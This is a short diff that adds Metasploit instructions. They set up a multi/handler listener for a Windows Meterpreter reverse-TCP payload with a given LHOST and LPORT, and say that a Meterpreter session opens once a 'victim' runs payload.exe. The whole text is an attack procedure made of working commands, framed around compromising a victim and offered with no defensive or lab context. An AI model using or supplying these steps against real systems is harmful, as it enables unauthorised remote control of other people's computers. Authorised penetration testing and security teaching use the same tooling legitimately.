@@ -1,0 +1,10 @@
+Open Metasploit:
+msfconsole
+Use multi/handler to listen:
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+run
+When victim runs payload.exe, you'll get a Meterpreter session.
+
